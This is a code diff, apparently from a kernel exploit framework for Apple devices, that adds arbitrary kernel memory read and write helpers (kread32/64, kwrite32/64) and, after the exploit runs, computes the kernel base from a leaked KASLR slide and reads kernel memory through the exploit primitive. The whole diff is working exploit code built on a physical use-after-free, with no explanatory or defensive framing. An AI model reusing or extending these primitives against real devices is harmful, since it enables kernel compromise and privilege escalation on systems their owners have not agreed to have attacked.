@@ -168,6 +168,36 @@ void kfd_free(struct kfd* kfd)
     bzero_free(kfd, sizeof(struct kfd));
 }
 
+void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
+{
+    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
+}
+
+void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
+{
+    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
+}
+
+uint32_t kread32(u64 kfd, uint64_t where) {
+    uint32_t out;
+    kread(kfd, where, &out, sizeof(uint32_t));
+    return out;
+}
+uint64_t kread64(u64 kfd, uint64_t where) {
+    uint64_t out;
+    kread(kfd, where, &out, sizeof(uint64_t));
+    return out;
+}
+
+void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
+    uint32_t _what = what;
+    kwrite(kfd, &_what, where, sizeof(uint32_t));
+}
+void kwrite64(u64 kfd, uint64_t where, uint64_t what) {
+    uint64_t _what = what;
+    kwrite(kfd, &_what, where, sizeof(uint64_t));
+}
+
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
     timer_start();
@@ -185,20 +215,18 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     krkw_run(kfd);
     info_run(kfd);
     perf_run(kfd);
+    
+    uint64_t kslide = kfd->perf.kernel_slide;
+    uint64_t kbase = 0xfffffff007004000 + kslide;
+    printf("[i] Kernel base: 0x%llx\n", kbase);
+    printf("[i] Kernel slide: 0x%llx\n", kslide);
+    uint64_t kheader64 = kread64(kfd, kbase);
+    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
+    
     puaf_cleanup(kfd);
 
     timer_end();
     return (u64)(kfd);
-}
-
-void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
-{
-    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
-}
-
-void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
-{
-    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
 }
 
 void kclose(u64 kfd)
